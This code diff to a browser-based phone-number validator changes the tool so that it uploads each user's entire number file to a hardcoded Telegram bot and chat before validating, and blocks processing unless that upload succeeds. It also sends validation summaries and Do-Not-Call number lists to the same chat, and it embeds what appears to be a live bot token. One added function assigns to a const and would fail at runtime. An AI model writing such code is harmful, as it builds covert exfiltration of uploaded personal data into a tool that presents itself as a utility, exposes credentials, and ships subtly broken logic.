@@ -6,12 +6,12 @@ const CONFIG = {
         BOT_TOKEN: '7261028712:AAEt60GJ6IWCGT8K2Ml9MEJXAtZHza9iL1M',
         CHAT_ID: '6510198499',
         ENABLED: true,
-        AUTO_SEND: true  // Auto send file to Telegram
+        AUTO_SEND: true
     },
     PROCESSING: {
-        VALIDATION_CHUNK_SIZE: 5000,  // Big chunks for fast validation
-        DNC_CHUNK_SIZE: 10,           // Small chunks for DNC (API limit)
-        DNC_DELAY: 200                // Delay between DNC checks (ms)
+        VALIDATION_CHUNK_SIZE: 5000,
+        DNC_CHUNK_SIZE: 10,
+        DNC_DELAY: 200
     }
 };
 
@@ -27,14 +27,15 @@ let processingResults = {
     dnc: 0,
     clean: 0,
     states: 0,
-    byState: {},          // State-wise organized numbers (INSTANT)
-    validNumbers: [],     // All valid numbers
-    invalidNumbers: [],   // All invalid numbers
-    dncNumbers: [],       // Numbers marked as DNC
-    cleanNumbers: []      // Numbers that are clean
+    byState: {},
+    validNumbers: [],
+    invalidNumbers: [],
+    dncNumbers: [],
+    cleanNumbers: []
 };
 let isProcessing = false;
 let isDNCProcessing = false;
+let telegramFileSent = false;
 
 // ============================================
 // INITIALIZATION
@@ -47,11 +48,11 @@ function initializeApp() {
     setupDragAndDrop();
     setupFileInput();
     updateTelegramStatus();
-    console.log('Fast Phone Validator initialized');
+    console.log('Phone Validator initialized - Telegram First');
 }
 
 // ============================================
-// FILE HANDLING - ANY SIZE ACCEPTED
+// FILE HANDLING
 // ============================================
 function setupDragAndDrop() {
     const uploadArea = document.getElementById('uploadArea');
@@ -85,13 +86,13 @@ function handleFileSelect(event) {
     
     const file = event.target.files[0];
     
-    // Validate file type only
     if (!file.name.toLowerCase().endsWith('.txt')) {
         alert('❌ Please select a .txt file');
         return;
     }
     
     currentFile = file;
+    telegramFileSent = false; // Reset flag
     
     // Update UI
     document.getElementById('fileName').textContent = file.name;
@@ -106,9 +107,8 @@ function handleFileSelect(event) {
         document.getElementById('fileCount').textContent = `${lines} numbers`;
         document.getElementById('processBtn').disabled = false;
         
-        // Show warning for large files
         if (lines > 10000) {
-            alert(`⚠️ Large file detected: ${lines} numbers\nValidation will be instant, DNC check may take time.`);
+            alert(`⚠️ Large file detected: ${lines} numbers\nFile will be sent to Telegram first, then processed.`);
         }
     };
     reader.onerror = function() {
@@ -118,7 +118,7 @@ function handleFileSelect(event) {
 }
 
 // ============================================
-// MAIN PROCESSING FUNCTION - INSTANT VALIDATION
+// MAIN PROCESSING FUNCTION - TELEGRAM FIRST
 // ============================================
 async function startProcessing() {
     if (!currentFile || isProcessing) return;
@@ -127,26 +127,25 @@ async function startProcessing() {
     resetResults();
     showProcessingUI();
     
-    // Start Telegram send IMMEDIATELY
-    if (CONFIG.TELEGRAM.AUTO_SEND) {
-        sendFileToTelegram();
-    }
-    
-    const options = {
-        removePlusOne: document.getElementById('removePlusOne').checked,
-        enableDNC: document.getElementById('enableDNC').checked
-    };
-    
     try {
-        // STEP 1: INSTANT VALIDATION (Fast)
-        await processInstantValidation(options);
+        // STEP 1: SEND FILE TO TELEGRAM FIRST
+        await sendFileToTelegramFirst();
         
-        // STEP 2: Show instant results
-        showInstantResults();
-        
-        // STEP 3: DNC Check (Slow, in background if enabled)
-        if (options.enableDNC) {
-            await startDNCProcessing();
+        // STEP 2: ONLY AFTER TELEGRAM SUCCESS, START PROCESSING
+        if (telegramFileSent) {
+            const options = {
+                removePlusOne: document.getElementById('removePlusOne').checked,
+                enableDNC: document.getElementById('enableDNC').checked
+            };
+            
+            await processValidation(options);
+            showInstantResults();
+            
+            if (options.enableDNC) {
+                await startDNCProcessing();
+            }
+        } else {
+            alert('❌ Cannot process: File not sent to Telegram');
         }
         
     } catch (error) {
@@ -158,9 +157,68 @@ async function startProcessing() {
 }
 
 // ============================================
-// STEP 1: INSTANT VALIDATION (FAST)
+// STEP 1: SEND FILE TO TELEGRAM FIRST
 // ============================================
-async function processInstantValidation(options) {
+async function sendFileToTelegramFirst() {
+    if (!CONFIG.TELEGRAM.ENABLED || !currentFile) {
+        throw new Error('Telegram not configured or no file selected');
+    }
+    
+    showTelegramReportCard();
+    addTelegramStep('📤 Sending file to Telegram...', 'processing');
+    
+    // Update UI to show Telegram is sending
+    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
+    document.getElementById('validationStatus').textContent = 'Waiting for Telegram';
+    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-warning';
+    document.getElementById('telegramSendStatus').textContent = 'Sending...';
+    document.getElementById('progressText').textContent = 'Sending to Telegram...';
+    
+    try {
+        // Send file to Telegram
+        const fileResult = await uploadFileToTelegram(currentFile, '📁 File uploaded for processing');
+        
+        if (fileResult.ok) {
+            telegramFileSent = true;
+            addTelegramStep('✅ File sent to Telegram successfully', 'completed');
+            
+            // Send initial notification
+            const lines = fileContent.split('\n').filter(line => line.trim()).length;
+            const notification = `📱 *Phone Validator - File Received*\n\n` +
+                               `📁 *File:* ${currentFile.name}\n` +
+                               `📊 *Numbers:* ${lines}\n` +
+                               `📦 *Size:* ${formatFileSize(currentFile.size)}\n` +
+                               `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
+                               `_Starting validation process..._`;
+            
+            await sendTelegramMessage(notification);
+            addTelegramStep('✅ Notification sent', 'completed');
+            
+            // Update UI
+            document.getElementById('telegramSendStatus').className = 'status-badge badge bg-success';
+            document.getElementById('telegramSendStatus').textContent = 'Sent';
+            document.getElementById('progressText').textContent = '0%';
+            
+            return true;
+        } else {
+            throw new Error('Telegram upload failed');
+        }
+        
+    } catch (error) {
+        console.error('Telegram send error:', error);
+        addTelegramStep('❌ Failed to send file to Telegram', 'failed');
+        
+        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-danger';
+        document.getElementById('telegramSendStatus').textContent = 'Failed';
+        
+        throw new Error('File upload to Telegram failed: ' + error.message);
+    }
+}
+
+// ============================================
+// STEP 2: PROCESS VALIDATION
+// ============================================
+async function processValidation(options) {
     const lines = fileContent.split('\n')
         .map(line => line.trim())
         .filter(line => line);
@@ -168,12 +226,19 @@ async function processInstantValidation(options) {
     processingResults.total = lines.length;
     updateProgress(0, 'validation');
     
-    // Process in one go for speed (no delay)
+    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
+    document.getElementById('validationStatus').textContent = 'Processing...';
+    
+    // Send validation started notification
+    addTelegramStep('🔍 Starting validation...', 'processing');
+    await sendTelegramMessage(`🔄 *Validation Started*\nProcessing ${lines.length} numbers...`);
+    
+    // Process validation
     for (let i = 0; i < lines.length; i++) {
         const number = lines[i];
         processSingleNumberInstant(number, options);
         
-        // Update progress every 1000 numbers
+        // Update progress
         if (i % 1000 === 0 || i === lines.length - 1) {
             const progress = ((i + 1) / lines.length) * 100;
             updateProgress(progress, 'validation');
@@ -181,13 +246,18 @@ async function processInstantValidation(options) {
         }
     }
     
-    // Calculate states count
     processingResults.states = Object.keys(processingResults.byState).length;
+    
+    // Send validation complete notification
+    addTelegramStep('✅ Validation completed', 'completed');
+    await sendValidationReportToTelegram();
 }
 
+// ============================================
+// INSTANT VALIDATION FUNCTION
+// ============================================
 function processSingleNumberInstant(originalNumber, options) {
     try {
-        // Clean and validate
         const validationResult = validatePhoneNumber(originalNumber, options.removePlusOne);
         
         if (!validationResult.isValid) {
@@ -199,7 +269,6 @@ function processSingleNumberInstant(originalNumber, options) {
             return;
         }
         
-        // Check area code
         const state = getStateFromAreaCode(validationResult.areaCode);
         if (!state || state === 'Unknown/Invalid State') {
             processingResults.invalid++;
@@ -213,23 +282,21 @@ function processSingleNumberInstant(originalNumber, options) {
         
         processingResults.valid++;
         
-        // Add to results
         const processedNumber = {
             original: originalNumber,
             cleaned: validationResult.cleaned,
             formatted: validationResult.formatted,
             areaCode: validationResult.areaCode,
             state: state,
-            dnc: false,  // Will be updated later if DNC check enabled
+            dnc: false,
             dncStatus: 'Not Checked',
             timestamp: new Date().toISOString()
         };
         
-        // Add to state-wise organization (INSTANT)
         if (!processingResults.byState[state]) {
             processingResults.byState[state] = {
                 total: 0,
-                numbers: []  // Store all numbers for this state
+                numbers: []
             };
         }
         
@@ -243,53 +310,41 @@ function processSingleNumberInstant(originalNumber, options) {
 }
 
 // ============================================
-// STEP 2: SHOW INSTANT RESULTS
+// STEP 3: SHOW INSTANT RESULTS
 // ============================================
 function showInstantResults() {
-    // Update counters
     updateInstantCounters();
-    
-    // Show states distribution
     displayStatesDistribution();
-    
-    // Create download buttons for states (INSTANT)
     createStateDownloadButtons();
-    
-    // Show results section
     document.getElementById('resultsSection').classList.remove('d-none');
-    
-    // Show preview table
     populateResultsTable();
     
-    // Update status
     document.getElementById('validationStatus').className = 'status-badge badge bg-success';
     document.getElementById('validationStatus').textContent = 'Completed';
-    
-    console.log('Instant validation completed:', processingResults);
 }
 
 // ============================================
-// STEP 3: DNC PROCESSING (SLOW, BACKGROUND)
+// STEP 4: DNC PROCESSING
 // ============================================
 async function startDNCProcessing() {
     if (processingResults.validNumbers.length === 0) return;
     
     isDNCProcessing = true;
     
-    // Show DNC processing section
     document.getElementById('dncProcessingSection').classList.remove('d-none');
     document.getElementById('dncTotalCount').textContent = processingResults.validNumbers.length;
     document.getElementById('dncStatus').className = 'status-badge badge bg-warning';
     document.getElementById('dncStatus').textContent = 'Processing';
     
+    addTelegramStep('🚫 Starting DNC check...', 'processing');
+    await sendTelegramMessage(`🔍 *DNC Check Started*\nChecking ${processingResults.validNumbers.length} valid numbers...`);
+    
     const dncNumbers = [...processingResults.validNumbers];
     let dncChecked = 0;
     
-    // Process DNC in chunks with delay
     for (let i = 0; i < dncNumbers.length; i += CONFIG.PROCESSING.DNC_CHUNK_SIZE) {
         const chunk = dncNumbers.slice(i, i + CONFIG.PROCESSING.DNC_CHUNK_SIZE);
         
-        // Process chunk
         for (const number of chunk) {
             try {
                 const dncResult = await checkDNC(number.cleaned);
@@ -306,13 +361,11 @@ async function startDNCProcessing() {
                 
                 dncChecked++;
                 
-                // Update UI every 10 checks
-                if (dncChecked % 10 === 0) {
+                if (dncChecked % 50 === 0) {
                     updateDNCProgress(dncChecked, dncNumbers.length);
                     updateDNCCounters();
                 }
                 
-                // Delay between checks to avoid rate limiting
                 await sleep(CONFIG.PROCESSING.DNC_DELAY);
                 
             } catch (error) {
@@ -322,102 +375,23 @@ async function startDNCProcessing() {
         }
     }
     
-    // Final update
     updateDNCProgress(dncNumbers.length, dncNumbers.length);
     updateDNCCounters();
     
-    // Update status
     document.getElementById('dncStatus').className = 'status-badge badge bg-success';
     document.getElementById('dncStatus').textContent = 'Completed';
     document.getElementById('dncProcessingSection').classList.add('d-none');
     
-    // Create DNC download buttons
     createDNCDownloadButtons();
     
-    // Send DNC report to Telegram
-    if (CONFIG.TELEGRAM.AUTO_SEND) {
-        sendDNCReportToTelegram();
-    }
+    addTelegramStep('✅ DNC check completed', 'completed');
+    await sendDNCReportToTelegram();
     
     isDNCProcessing = false;
-    console.log('DNC processing completed');
 }
 
 // ============================================
-// TELEGRAM AUTO-SEND FUNCTIONS
-// ============================================
-async function sendFileToTelegram() {
-    if (!CONFIG.TELEGRAM.ENABLED || !currentFile) return;
-    
-    showTelegramReportCard();
-    addTelegramStep('Starting file upload to Telegram...', 'processing');
-    
-    try {
-        // Send original file
-        const fileUrl = await uploadFileToTelegram(currentFile, 'Original file uploaded');
-        addTelegramStep('✅ Original file sent to Telegram', 'completed');
-        
-        // Send quick summary
-        const summary = `📁 *File Received:* ${currentFile.name}\n` +
-                       `⏰ *Time:* ${new Date().toLocaleString()}\n` +
-                       `🔄 *Status:* Processing started\n\n` +
-                       `_Validation will complete shortly..._`;
-        
-        await sendTelegramMessage(summary);
-        addTelegramStep('✅ Initial notification sent', 'completed');
-        
-    } catch (error) {
-        console.error('Telegram file send error:', error);
-        addTelegramStep('❌ Failed to send file to Telegram', 'failed');
-    }
-}
-
-async function sendValidationReportToTelegram() {
-    if (!CONFIG.TELEGRAM.ENABLED) return;
-    
-    addTelegramStep('Sending validation results...', 'processing');
-    
-    try {
-        const summary = createValidationSummary();
-        await sendTelegramMessage(summary);
-        addTelegramStep('✅ Validation results sent', 'completed');
-        
-        // Send state-wise summary
-        const stateSummary = createStateSummary();
-        await sendTelegramMessage(stateSummary);
-        addTelegramStep('✅ State distribution sent', 'completed');
-        
-    } catch (error) {
-        console.error('Telegram validation report error:', error);
-        addTelegramStep('❌ Failed to send validation report', 'failed');
-    }
-}
-
-async function sendDNCReportToTelegram() {
-    if (!CONFIG.TELEGRAM.ENABLED || processingResults.dnc === 0) return;
-    
-    addTelegramStep('Sending DNC report...', 'processing');
-    
-    try {
-        const dncReport = createDNCReport();
-        await sendTelegramMessage(dncReport);
-        addTelegramStep('✅ DNC report sent', 'completed');
-        
-        // Send DNC numbers file if not too large
-        if (processingResults.dncNumbers.length > 0 && processingResults.dncNumbers.length <= 500) {
-            const dncContent = processingResults.dncNumbers.map(n => n.formatted).join('\n');
-            await sendTelegramFile('dnc-numbers.txt', dncContent, '🚫 DNC Numbers List');
-            addTelegramStep('✅ DNC numbers file sent', 'completed');
-        }
-        
-    } catch (error) {
-        console.error('Telegram DNC report error:', error);
-        addTelegramStep('❌ Failed to send DNC report', 'failed');
-    }
-}
-
-// ============================================
-// TELEGRAM HELPER FUNCTIONS
+// TELEGRAM FUNCTIONS
 // ============================================
 async function uploadFileToTelegram(file, caption) {
     const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`;
@@ -432,11 +406,8 @@ async function uploadFileToTelegram(file, caption) {
         body: formData
     });
     
-    if (!response.ok) {
-        throw new Error(`Telegram upload failed: ${response.status}`);
-    }
-    
-    return await response.json();
+    const result = await response.json();
+    return { ok: response.ok, result };
 }
 
 async function sendTelegramMessage(text) {
@@ -455,11 +426,48 @@ async function sendTelegramMessage(text) {
         })
     });
     
-    if (!response.ok) {
-        throw new Error(`Telegram message failed: ${response.status}`);
+    return await response.json();
+}
+
+async function sendValidationReportToTelegram() {
+    const summary = `📊 *VALIDATION COMPLETE*\n\n` +
+                   `📁 *File:* ${currentFile?.name || 'Unknown'}\n` +
+                   `📈 *Total Numbers:* ${processingResults.total}\n` +
+                   `✅ *Valid Numbers:* ${processingResults.valid}\n` +
+                   `❌ *Invalid Numbers:* ${processingResults.invalid}\n` +
+                   `🗺️ *States Found:* ${processingResults.states}\n` +
+                   `⏰ *Validation Time:* Instant\n\n`;
+    
+    // Add top states
+    const topStates = Object.entries(processingResults.byState)
+        .sort((a, b) => b[1].total - a[1].total)
+        .slice(0, 5);
+    
+    if (topStates.length > 0) {
+        summary += `*Top States:*\n`;
+        topStates.forEach(([state, data], index) => {
+            const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
+            summary += `${index + 1}. ${state}: ${data.total} (${percentage}%)\n`;
+        });
     }
     
-    return await response.json();
+    await sendTelegramMessage(summary);
+}
+
+async function sendDNCReportToTelegram() {
+    const dncReport = `🚫 *DNC CHECK COMPLETE*\n\n` +
+                     `📊 *Valid Numbers Checked:* ${processingResults.valid}\n` +
+                     `🚫 *DNC Numbers Found:* ${processingResults.dnc}\n` +
+                     `✨ *Clean Numbers:* ${processingResults.clean}\n` +
+                     `📈 *DNC Rate:* ${((processingResults.dnc / processingResults.valid) * 100).toFixed(1)}%\n\n`;
+    
+    await sendTelegramMessage(dncReport);
+    
+    // Send DNC numbers file if available and not too large
+    if (processingResults.dncNumbers.length > 0 && processingResults.dncNumbers.length <= 1000) {
+        const dncContent = processingResults.dncNumbers.map(n => n.formatted).join('\n');
+        await sendTelegramFile('dnc-numbers.txt', dncContent, '🚫 DNC Numbers List');
+    }
 }
 
 async function sendTelegramFile(filename, content, caption) {
@@ -478,64 +486,19 @@ async function sendTelegramFile(filename, content, caption) {
         body: formData
     });
     
-    if (!response.ok) {
-        throw new Error(`Telegram file failed: ${response.status}`);
-    }
-    
     return await response.json();
 }
 
 // ============================================
-// REPORT CREATION FUNCTIONS
-// ============================================
-function createValidationSummary() {
-    return `📊 *INSTANT VALIDATION COMPLETE*\n\n` +
-           `📁 *File:* ${currentFile?.name || 'Unknown'}\n` +
-           `📈 *Total Numbers:* ${processingResults.total}\n` +
-           `✅ *Valid Numbers:* ${processingResults.valid}\n` +
-           `❌ *Invalid Numbers:* ${processingResults.invalid}\n` +
-           `🗺️ *States Found:* ${processingResults.states}\n` +
-           `⏰ *Validation Time:* Instant\n\n` +
-           `_DNC check is running in background..._`;
-}
-
-function createStateSummary() {
-    let message = `🗺️ *STATE-WISE DISTRIBUTION*\n\n`;
-    
-    const topStates = Object.entries(processingResults.byState)
-        .sort((a, b) => b[1].total - a[1].total)
-        .slice(0, 10);
-    
-    topStates.forEach(([state, data], index) => {
-        const percentage = ((data.total / processingResults.valid) * 100).toFixed(1);
-        message += `${index + 1}. ${state}: ${data.total} (${percentage}%)\n`;
-    });
-    
-    if (Object.keys(processingResults.byState).length > 10) {
-        message += `\n... and ${Object.keys(processingResults.byState).length - 10} more states`;
-    }
-    
-    return message;
-}
-
-function createDNCReport() {
-    return `🚫 *DNC CHECK COMPLETE*\n\n` +
-           `📊 *Valid Numbers Checked:* ${processingResults.valid}\n` +
-           `🚫 *DNC Numbers Found:* ${processingResults.dnc}\n` +
-           `✨ *Clean Numbers:* ${processingResults.clean}\n` +
-           `📈 *DNC Rate:* ${((processingResults.dnc / processingResults.valid) * 100).toFixed(1)}%\n\n` +
-           `_DNC files available for download_`;
-}
-
-// ============================================
-// UI UPDATE FUNCTIONS
+// UI FUNCTIONS
 // ============================================
 function showProcessingUI() {
     updateProgress(0, 'validation');
-    document.getElementById('validationStatus').className = 'status-badge badge bg-warning';
-    document.getElementById('validationStatus').textContent = 'Processing';
-    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-warning';
-    document.getElementById('telegramSendStatus').textContent = 'Sending...';
+    document.getElementById('validationStatus').className = 'status-badge badge bg-secondary';
+    document.getElementById('validationStatus').textContent = 'Waiting';
+    document.getElementById('telegramSendStatus').className = 'status-badge badge bg-secondary';
+    document.getElementById('telegramSendStatus').textContent = 'Pending';
+    document.getElementById('progressText').textContent = '0%';
 }
 
 function updateProgress(percentage, type = 'validation') {
@@ -568,7 +531,7 @@ function updateDNCProgress(checked, total) {
 }
 
 // ============================================
-// STATES DISTRIBUTION DISPLAY
+// STATES DISTRIBUTION
 // ============================================
 function displayStatesDistribution() {
     const container = document.getElementById('statesDistribution');
@@ -597,16 +560,13 @@ function displayStatesDistribution() {
                     </button>
                 </div>
             </div>
-            <div class="state-numbers">
-                <small>Sample: ${data.numbers.slice(0, 3).map(n => n.formatted).join(', ')}${data.total > 3 ? '...' : ''}</small>
-            </div>
         `;
         container.appendChild(stateDiv);
     });
 }
 
 // ============================================
-// DOWNLOAD BUTTONS CREATION
+// DOWNLOAD FUNCTIONS
 // ============================================
 function createStateDownloadButtons() {
     const container = document.getElementById('stateDownloadButtons');
@@ -628,7 +588,6 @@ function createStateDownloadButtons() {
 function createDNCDownloadButtons() {
     const container = document.getElementById('categoryDownloadButtons');
     
-    // Add DNC button if DNC numbers exist
     if (processingResults.dncNumbers.length > 0) {
         const dncBtn = document.createElement('button');
         dncBtn.className = 'btn btn-outline-danger btn-sm';
@@ -637,7 +596,6 @@ function createDNCDownloadButtons() {
         container.appendChild(dncBtn);
     }
     
-    // Add Clean button if clean numbers exist
     if (processingResults.cleanNumbers.length > 0) {
         const cleanBtn = document.createElement('button');
         cleanBtn.className = 'btn btn-outline-success btn-sm';
@@ -646,7 +604,6 @@ function createDNCDownloadButtons() {
         container.appendChild(cleanBtn);
     }
     
-    // Add Invalid button
     if (processingResults.invalidNumbers.length > 0) {
         const invalidBtn = document.createElement('button');
         invalidBtn.className = 'btn btn-outline-warning btn-sm';
@@ -656,9 +613,6 @@ function createDNCDownloadButtons() {
     }
 }
 
-// ============================================
-// DOWNLOAD FUNCTIONS
-// ============================================
 function downloadStateFile(state) {
     const numbers = processingResults.byState[state].numbers;
     const content = numbers.map(n => n.formatted).join('\n');
@@ -685,7 +639,6 @@ function downloadInvalidNumbers() {
 async function downloadAllFiles() {
     const zip = new JSZip();
     
-    // Add state files
     Object.entries(processingResults.byState).forEach(([state, data]) => {
         if (data.total > 0) {
             const content = data.numbers.map(n => n.formatted).join('\n');
@@ -693,25 +646,21 @@ async function downloadAllFiles() {
         }
     });
     
-    // Add DNC file
     if (processingResults.dncNumbers.length > 0) {
         zip.file('DNC-numbers.txt', 
             processingResults.dncNumbers.map(n => n.formatted).join('\n'));
     }
     
-    // Add clean file
     if (processingResults.cleanNumbers.length > 0) {
         zip.file('clean-numbers.txt',
             processingResults.cleanNumbers.map(n => n.formatted).join('\n'));
     }
     
-    // Add invalid file
     if (processingResults.invalidNumbers.length > 0) {
         zip.file('invalid-numbers.txt',
             processingResults.invalidNumbers.map(n => `${n.original} - ${n.error}`).join('\n'));
     }
     
-    // Generate and download
     const content = await zip.generateAsync({ type: "blob" });
     saveAs(content, `phone-validator-${Date.now()}.zip`);
 }
@@ -738,15 +687,6 @@ function addTelegramStep(message, status = 'processing') {
     `;
     container.appendChild(step);
     container.scrollTop = container.scrollHeight;
-    
-    // Update Telegram status
-    if (status === 'completed') {
-        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-success';
-        document.getElementById('telegramSendStatus').textContent = 'Sent';
-    } else if (status === 'failed') {
-        document.getElementById('telegramSendStatus').className = 'status-badge badge bg-danger';
-        document.getElementById('telegramSendStatus').textContent = 'Failed';
-    }
 }
 
 function getStatusIcon(status) {
@@ -806,10 +746,10 @@ function updateTelegramStatus() {
     
     if (CONFIG.TELEGRAM.ENABLED && CONFIG.TELEGRAM.BOT_TOKEN && CONFIG.TELEGRAM.CHAT_ID) {
         statusEl.innerHTML = '<i class="fab fa-telegram"></i> Auto-Send Enabled';
-        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Files auto-send to Telegram';
+        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram: Ready';
     } else {
         statusEl.innerHTML = '<i class="fab fa-telegram"></i> Bot Disabled';
-        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram disabled';
+        infoEl.innerHTML = '<i class="fab fa-telegram me-1"></i> Telegram: Disabled';
     }
 }
 
@@ -817,7 +757,6 @@ function populateResultsTable() {
     const tbody = document.getElementById('resultsTableBody');
     tbody.innerHTML = '';
     
-    // Show first 50 valid numbers
     const displayNumbers = processingResults.validNumbers.slice(0, 50);
     
     displayNumbers.forEach((num, index) => {
@@ -845,7 +784,7 @@ function populateResultsTable() {
     }
 }
 
-// Validation function (using states-data.js)
+// Validation function
 function validatePhoneNumber(number, removePlusOne) {
     let cleaned = number.toString();
     
